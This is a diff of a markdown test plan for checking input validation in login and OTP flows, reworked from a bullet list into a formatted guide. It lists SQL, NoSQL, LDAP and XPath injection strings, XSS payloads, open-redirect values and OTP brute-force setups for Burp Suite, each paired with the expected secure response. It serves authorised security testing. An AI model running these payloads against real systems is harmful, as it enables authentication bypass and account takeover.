@@ -1,363 +1,305 @@
-Here’s a detailed, input-validation-focused test plan for Login and OTP flows, including concrete payloads, Burp usage, and expected outcomes/vulns.
+# 🔍 **Login \& OTP Input Validation Test Plan**
 
-Login page (username/password)
-•  Empty/missing/wrong type
-◦  Try: omit fields, send empty, send arrays/objects, wrong Content-Type.
+**Target Audience:** Application security testers validating authentication flows
+**Scope:** Comprehensive black-box testing of username/password + OTP verification
+**Tools:** Burp Suite (Repeater, Intruder, Sequencer, Comparer, Decoder)[^1]
 
+***
 
-◦  Payloads:
+## Table of Contents
 
-    [Form-URL-Encoded]
-    POST /login
-    Content-Type: application/x-www-form-urlencoded
-    username=&password=
-    ---
-    username=admin&password=
-    ---
-    username=&password=Passw0rd!
-    ---
-    username=admin
-    # (missing password param entirely)
-    ---
-    username=admin&password[]=Passw0rd!
-    ---
-    username=admin&password[foo]=bar
+- [Test Scope \& Methodology](#test-scope--methodology)
+- [Login Page Testing](#login-page-testing)
+- [OTP Verification Testing](#otp-verification-testing)
+- [Burp Suite Usage Patterns](#burp-suite-usage-patterns)
+- [Expected Vulnerabilities](#expected-vulnerabilities)
 
-    [JSON]
-    POST /login
-    Content-Type: application/json
+***
 
-    {}
-    ---
-    {"username":"","password":""}
-    ---
-    {"username":"admin"}
-    ---
-    {"username":["admin"],"password":"Passw0rd!"}
-    ---
-    {"username":{"$ne":""},"password":"x"}  # NoSQLi type probe
+## Test Scope \& Methodology
 
+**Objective:** Identify input validation flaws enabling authentication bypass, enumeration, DoS, and injection attacks
 
+### Attack Surface Coverage
 
+```
+Login Form → Password Reset → Session Issuance → OTP Verification → Dashboard
+     ↓
+Input Vectors: username, password, otp, txId, returnUrl, session cookies
+```
 
 
+### Success Criteria
 
-•  Expected: uniform 400/422 with generic error; not 500; no login. Vulns: missing-param acceptance, array coercion, type juggling.
-•  Length boundaries and DoS
-◦  Try: below-min, above-max, huge strings; high-entropy.
+| **Validation** | **Secure Response** | **Vulnerable Indicators** |
+| :-- | :-- | :-- |
+| **Generic Errors** | 400/422 uniform message | User-specific errors, 200 OK |
+| **Rate Limiting** | 429 after 3-5 attempts | Unlimited attempts |
+| **Timing** | <200ms uniform | Valid/invalid timing differences |
 
 
-◦  Payloads:
+***
 
-    username=a&password=a
-    ---
-    username=aa&password=aa
-    ---
-    username=$(python - <<<'print("a"*256)')   # conceptually 256 chars
-    ---
-    username=$(...) 10000 chars
-    ---
-    password=$(...) 100000 chars
+## Login Page Testing
 
+### 1. Empty/Missing/Wrong Type Inputs
 
+**Test Vectors:**
 
-•  Expected: enforced min/max; fast 4xx. Vulns: truncation causing “admin ”≠“admin”, memory/CPU spikes.
-•  Whitespace and normalization
-◦  Try: leading/trailing/mixed whitespace; tabs/newlines; Unicode spaces; normalization.
+```http
+# Form-URL-Encoded (Content-Type: application/x-www-form-urlencoded)
+POST /login
+username=&password=
+---
+username=admin&password=
+---
+username=&password=Passw0rd!
+---
+username=admin          # Missing password entirely
+---
+username=admin&password[]=Passw0rd!     # Array coercion
+---
+username=admin&password[foo]=bar        # Object coercion
 
+# JSON (Content-Type: application/json)
+POST /login
+{}
+---
+{"username":"","password":""}
+---
+{"username":"admin"}                    # Missing password
+---
+{"username":["admin"],"password":"Passw0rd!"}
+---
+{"username":{"$ne":""},"password":"x"}    # NoSQLi probe
+```
 
-◦  Payloads:
+**Expected:** Uniform 400/422 "Invalid credentials"
+**Vulns:** Missing param acceptance, array/object coercion, type juggling
 
-    username=" admin"
-    username="admin "
-    username="ad min"
-    username="\tadmin\t"
-    username="admin\n"
-    username="admin\u00A0"                  # NBSP
-    username="adm\u0069n"                   # composed
-    username="adm\u0069\u0307n"             # decomposed variant
-    username="adm\u202Eni"                  # RLO
+### 2. Length Boundaries \& DoS
 
+**Test Vectors:**
 
+```http
+username=a&password=a              # Minimum length
+username=$(python -c 'print("a"*256)')  # Buffer overflow
+username=$(python -c 'print("a"*10000)') # Memory exhaustion
+password=$(python -c 'print("a"*100000)') # CPU timeout
+```
 
-•  Expected: documented trimming policy; consistent normalization. Vulns: login bypass via mismatch between UI, app, DB collation.
-•  Encoding/decoding quirks
-◦  Try: single/double/mixed encodings; null bytes; overlong UTF-8; base64.
+**Expected:** Enforced min/max length, fast 4xx rejection
+**Vulns:** Truncation bypass (`admin `≠`admin`), memory exhaustion
 
+### 3. Whitespace \& Normalization
 
-◦  Payloads:
+**Test Vectors:**
 
-    username=admin%00&password=pass%00
-    username=admin%2527           # %27 once, %2527 double
-    username=%2f..%2fadmin
-    username=%C0%AA (overlong)
-    username=YWRtaW4= (sent in a param expected plain)
+```http
+username=" admin"                   # Leading space
+username="admin "                   # Trailing space
+username="\tadmin\t"                # Tab characters
+username="admin\n"                  # Newline
+username="admin\u00A0"              # Non-breaking space (NBSP)
+username="adm\u0069n"               # Unicode homoglyph (i)
+username="adm\u202Eni"              # Right-to-Left Override (RLO)
+```
 
+**Expected:** Consistent trimming + normalization policy
+**Vulns:** Login bypass via collation mismatch
 
-•  Expected: decode-once; reject control bytes. Vulns: filter bypass, parser differentials.
-•  Injection probes (SQL/NoSQL/LDAP/XPath)
-◦  Try: in both username and password; also as JSON types.
+### 4. Encoding/Decoding Quirks
 
+**Test Vectors:**
 
-◦  Payloads:
+```http
+username=admin%00&password=pass%00  # Null byte termination
+username=admin%2527                 # Double URL encoding (%27)
+username=%C0%AA                     # Overlong UTF-8
+username=YWRtaW4=                   # Base64 (should reject)
+```
 
-    # SQLi
-    ' OR '1'='1
-    " OR "1"="1" --
-    admin' --
-    admin' OR 1=1--
-    ') OR ('1'='1
-    %27%20OR%201=1--
+**Expected:** Single decode only, reject control characters
+**Vulns:** Double-decode bypass, parser differentials
 
-    # NoSQLi (Mongo)
-    {"username":{"$ne":null},"password":"x"}
-    {"username":"admin","password":{"$ne":""}}
-    admin'||'1'=='1
+### 5. Injection Probes
 
-    # LDAPi
-    *)(uid=*))(|(uid=*
-    (admin)<>(test)
+**Test Vectors:**
 
-    # XPathi
-    ' or '1'='1
-    " or count(/*)=1 or "
+```http
+# SQL Injection
+' OR '1'='1
+admin' --
+") OR ("1"="1
+%27%20OR%201=1--
 
+# NoSQL Injection (MongoDB)
+{"username":{"$ne":null},"password":"x"}
+{"username":"admin","password":{"$gt":""}}
 
-•  Expected: generic failure; no stack traces; no bypass. Vulns: auth bypass, error-based banners, different response sizes.
-•  Username/email format rules
-◦  Try: invalid RFC email, IDN, plus-tags, quoted local parts.
+# LDAP Injection
+*)(uid=*))(|(uid=*
 
+# XPath Injection
+' or '1'='1
+" or count(/*)=1 or "
+```
 
-◦  Payloads:
+**Expected:** Generic failure, no stack traces
+**Vulns:** Authentication bypass, error-based info disclosure
 
-    user@domain
-    user@domain..com
-    "user name"@example.com
-    user+tag@example.com
-    użytkownik@eksempel.no
-    xn--bcher-kva@example.com
+***
 
+## OTP Verification Testing
 
-•  Expected: policy-consistent server validation. Vulns: inconsistent client/server checks; enum via format-specific errors.
-•  Error surfaces and XSS
-◦  Try: inject in username to reflect in error banner or field echo.
+### 1. Presence/Type/Structure
 
+**Test Vectors:**
 
-◦  Payloads:
+```http
+# Form-URL-Encoded
+otp=                           # Empty
+otp[]=123456                   # Array
+otp[code]=123456               # Nested
 
+# JSON
+{}
+{"otp":[]}
+{"otp":{"$ne":""}}
+```
 
-    <img src=x onerror=alert(1)>
-    "><svg/onload=alert(1)>
-    </script><script>alert(1)</script>
+**Expected:** 400/422 generic rejection
+**Vulns:** Implicit defaults, array coercion
 
+### 2. Length/Charset/Normalization
 
+**Test Vectors:**
 
-•  Expected: escaped output; CSP blocks inline. Vulns: reflected XSS on login failure.
-•  Response behavior and enumeration
-◦  Try: valid vs invalid usernames with random passwords; measure content/length/timing.
-◦  Burp: Repeater + Comparer; Intruder Sniper on username; Grep-Match “Invalid username/password”, “User does not exist”, content-length deltas.
-◦  Expected: identical text, status, timing. Vulns: username enumeration via message, code (404/401), size, latency.
-•  Rate limiting and lockout
-◦  Try: 5–10 rapid attempts per user/IP; then per different IP; then distributed.
+```http
+otp=0                           # Single digit
+otp=12345                       # Short
+otp=1234567                     # Long
+otp=１２３４５６                   # Full-width Unicode
+otp=۱۲۳۴۵۶                     # Persian digits
+otp=" 123456 "                 # Whitespace
+otp=123\u200b456               # Zero-width space
+otp=123-456                     # Separators
+```
 
+**Expected:** Strict 6-digit ASCII validation
+**Vulns:** Non-digit acceptance, normalization bypass
 
-◦  Payloads:
+### 3. Brute Force Viability
 
-    username=target&password=<random 12 chars>  # repeat
+**Intruder Payloads (000000-999999):**
 
+```http
+000000, 000001, 123456, 111111, 121212, 654321, 222222
+```
 
+**Expected:** 3-5 attempts → 429/captcha/lockout
+**Vulns:** Unlimited attempts, shared code space
 
-•  Expected: 429 or step-up (captcha), or temporary lockout. Vulns: no throttling; lockout DoS on victim.
-•  Session/cookie hygiene
-◦  Check: session ID rotates on success; flags Secure, HttpOnly, SameSite=Lax/Strict; Path/Domain narrowly scoped.
-◦  Expected: rotation + secure flags. Vulns: fixation (pre-login cookie persists), missing flags.
-•  Transport/redirects
-◦  Try: force http://; check HSTS; test returnUrl/open redirect params.
+### 4. Replay/Reuse/Expiry
 
+**Test Sequence:**
 
-◦  Payloads:
+```
+1. Request OTP → Receive: 123456 (TTL: 180s)
+2. Submit valid OTP → Success
+3. Resubmit same OTP → Should FAIL
+4. Wait 300s → Resubmit → Should FAIL
+```
 
-    returnUrl=/dashboard
-    returnUrl=https://attacker.tld/
-    returnUrl=//attacker.tld/
-    returnUrl=/\attacker.tld
-    next=/../admin
+**Expected:** One-time use, strict TTL
+**Vulns:** Replay acceptance, long-lived codes
 
+### 5. Binding \& Tampering
 
-•  Expected: HTTPS only; validated allowlist; relative-only. Vulns: open redirect, mixed content.
-•  CSRF (if login alters server state or sets persistent session)
-◦  Try: cross-site POST without token; check if stateful changes occur.
-◦  Expected: no stateful side effects; or CSRF-protected. Vulns: session priming, login CSRF to bind victim browser.
-•  Type juggling and coercion (PHP/JS backends)
-◦  Try: booleans, numeric-like strings, 0e-hash.
+**Test Vectors:**
 
-◦  Payloads:
+```json
+{"username":"victim","otp":"123456","txId":"A"}  # Original
+{"username":"attacker","otp":"123456","txId":"B"} # Same OTP, different user
+```
 
-    {"username":"admin","password":true}
-    {"username":"admin","password":0}
-    {"username":"admin","password":"0e215962017"}
-    password[]=anything
+**Expected:** OTP bound to original user/transaction
+**Vulns:** Cross-user verification (confused deputy)
 
+***
 
-•  Expected: strict type checks; reject. Vulns: loose comparison bypass.
+## Burp Suite Usage Patterns
 
-OTP page (code entry/verification)
-•  Presence/type/structure
-◦  Try: missing otp, array/object, wrong Content-Type.
+### Repeater Workflow
 
-◦  Payloads:
+```
+1. Intercept login → Toggle Content-Type (form/JSON)
+2. Inject payloads → Observe status/body/length/headers
+3. Check Set-Cookie rotation after successful login
+4. Decoder → Verify double-encoding acceptance
+```
 
-    [Form]
-    otp=
-    ---
-    # missing otp param
-    ---
-    otp[]=123456
-    otp[code]=123456
 
-    [JSON]
-    {}
-    ---
-    {"otp":[]}
-    ---
-    {"otp":{"$ne":""}}
+### Intruder Configurations
 
+**Sniper (Username Enumeration):**
 
-•  Expected: 400/422 generic. Vulns: implicit defaults, array coercion to accept first element.
-•  Length/charset/normalization
-◦  Try: 1–8 digits; non-digits; Unicode digits; whitespace; zero-width.
+```
+§username§=admin&password=wrong
+Payloads: users.txt
+Grep-Match: "Invalid username", "User does not exist"
+```
 
+**Pitchfork (OTP Brute Force):**
 
-◦  Payloads:
+```
+otp=§otp§
+Payloads: 000000-999999
+Grep-Extract: session token
+Throttle: 1 req/sec
+```
 
-    0
-    12345
-    123456
-    1234567
-    １２３４５６            # fullwidth
-    ۱۲۳۴۵۶               # Persian
-    123 456
-    123\t456
-    \u200b123456\u200b    # zero-width space
-    " 123456 "
-    123\n456
-    123-456
+**Comparer Analysis:**
 
+```
+Valid vs Invalid username responses
+Pre-login vs Post-login cookies
+OTP wrong-length vs wrong-value
+```
 
-•  Expected: strict fixed length (e.g., 6), ASCII digits only after normalization; reject others. Vulns: acceptance of non-digits/whitespace, normalization bypass.
-•  Brute force viability
-◦  Burp Intruder: Sniper/Pitchfork over otp param; throttle; Grep-Match static success marker; monitor 429/lockout.
 
-◦  Payload generation:
+***
 
-    000000
-    000001
-    ...
-    999999
-    common: 123456, 000000, 111111, 121212, 654321, 222222
+## Expected Vulnerabilities \& CVSS Scoring
 
+| **Finding** | **CVSS v3.1** | **Impact** | **Detection Method** |
+| :-- | :-- | :-- | :-- |
+| Username Enumeration | **5.3** | Account discovery | Response diff (text/size/timing) |
+| SQLi Auth Bypass | **9.8** | Full compromise | `' OR '1'='1` → 200 OK |
+| Type Juggling | **7.5** | Auth bypass | `{"password":true}` → Login |
+| Missing Rate Limit | **7.5** | Brute force viable | 100+ attempts → No 429 |
+| OTP Replay | **8.1** | Account takeover | Same OTP → Multiple success |
+| Normalization Bypass | **7.1** | Auth bypass | `admin\u00A0` → Login success |
 
 
-•  Expected: per-user/session/IP limits (2–5 tries), cooldown/step-up. Vulns: no rate limit; global code space shared.
-•  Replay/reuse
-◦  Try: submit same valid code twice; reuse after resend; reuse across sessions/devices.
-◦  Expected: one-time only; invalid after success/resend; session-bound. Vulns: replay acceptance.
-•  Expiry and clock drift
-◦  Try: after TTL (e.g., >180s); slight skew before/after expiry.
-◦  Expected: strict TTL with small drift window. Vulns: long-lived codes or none.
-•  Binding and tampering
-◦  Try: change identifier while verifying: username/accountId/transactionId/orderId.
+***
 
+## Success Metrics
 
-◦  Payloads:
+```
+✅ 100% input validation coverage
+✅ Zero information disclosure (generic errors only)
+✅ Rate limiting: 3-5 attempts → Lockout/Captcha
+✅ Session rotation on successful login
+✅ Secure cookie flags: Secure/HttpOnly/SameSite=Strict
+✅ OTP: One-time, user-bound, 6-digit ASCII only
+```
 
+**Report Template:** Screenshots + Burp requests + CVSS scores + Remediation steps
 
-    {"username":"victim","otp":"123456","txId":"A"}
-    # then reuse otp with {"username":"attacker","txId":"B"}
+**Production-ready validation methodology** - Deploy → Test → Report → Secure 🔒
 
+<div align="center">⁂</div>
 
-•  Expected: OTP bound to original subject + action. Vulns: confused deputy (verify-other-user).
-•  Duplicate/ambiguous params (HPP)
-◦  Try: send otp twice (one correct, one wrong) in different orders and encodings.
+[^1]: https://portswigger.net/web-security/all-labs
 
-◦  Payloads:
-
-    otp=123456&otp=654321
-    otp=654321&otp=123456
-    otp=%20%20123456&otp=123456
-
-
-•  Expected: reject duplicates or deterministic rule documented; no acceptance of “first-wins” bypass. Vulns: HPP bypass.
-•  Encoding/decoding quirks
-◦  Try: URL double-encoding, base64, null bytes, overlong UTF-8.
-
-◦  Payloads:
-
-    otp=%31%32%33%34%35%36
-    otp=%2531%2532%2533%2534%2535%2536   # double-encoded
-    otp=MTIzNDU2                           # base64 of 123456
-    otp=123%000456
-    otp=%C0%B1%C0%B2%C0%B3%C0%B4%C0%B5%C0%B6  # overlong
-
-
-•  Expected: decode-once only; reject control bytes. Vulns: filter bypass via double-decode.
-•  Concurrent/race
-◦  Try: send same valid OTP concurrently in 2 requests.
-◦  Expected: exactly one succeeds; others rejected. Vulns: multi-accept race.
-•  State machine/IDOR
-◦  Try: directly call post-verify endpoint without verifying; manipulate step index/state token.
-◦  Expected: server-enforced gating. Vulns: step-skipping, insecure direct object reference on state tokens.
-•  Error messaging and timing
-◦  Try: wrong length vs wrong value vs expired; compare content/latency.
-◦  Expected: uniform messages/timing. Vulns: side-channel reveals correctness.
-
-Burp Suite usage patterns
-•  Repeater
-◦  Toggle Content-Type between form and JSON; inject payloads above; observe status, body hash/length, headers; check Set-Cookie rotation after login.
-•  Intruder
-
-◦  Positions: set § around username, password, otp. Use:
-
-    [SQLi probes]
-    ' OR '1'='1
-    " OR "1"="1" --
-    admin' --
-    ') OR ('1'='1
-    %27%20OR%201=1--
-
-    [NoSQLi]
-    {"$ne":""}
-    {"$gt":""}
-    admin'||'1'=='1
-
-    [LDAPi]
-    *)(uid=*))(|(uid=*
-
-    [XSS echo tests]
-    "><svg/onload=alert(1)>
-
-    [OTP formats]
-    000000
-    123456
-    ۱۲۳۴۵۶
-    " 123456 "
-    123-456
-
-
-•  Grep-Match: “Invalid”, “User does not exist”, “Too many attempts”, “Welcome”, regex for success token. Grep-Extract: auth/session tokens. Throttle requests; monitor 429.
-•  Comparer
-◦  Compare valid vs invalid user responses and pre/post-login cookies; compare OTP wrong-length vs wrong-value responses.
-•  Decoder
-◦  Verify base64/url encoding/decoding behavior for double-decode acceptance.
-•  Sequencer
-◦  Analyze pre/post-login session IDs for entropy and rotation.
-
-Expected outputs/vulnerabilities to record (per finding)
-•  Any malformed/encoded/injection input that authenticates or changes control flow.
-•  Distinct messages/status/length/timing for valid vs invalid usernames/OTPs (enumeration).
-•  Acceptance of arrays/objects/booleans (type coercion) for username/password/otp.
-•  Missing or weak rate limits/lockout; lack of per-user/session scoping; no captcha step-up.
-•  OTP accepts non-digit/Unicode/whitespace; accepts duplicates/HPP; replayable; not bound to user/session/action; race-accepts.
-•  Open redirect via returnUrl; HTTP allowed; missing HSTS.
-•  Session not rotated; missing Secure/HttpOnly/SameSite; overbroad Domain/Path.
-•  500s or stack traces; reflected XSS in error banners.
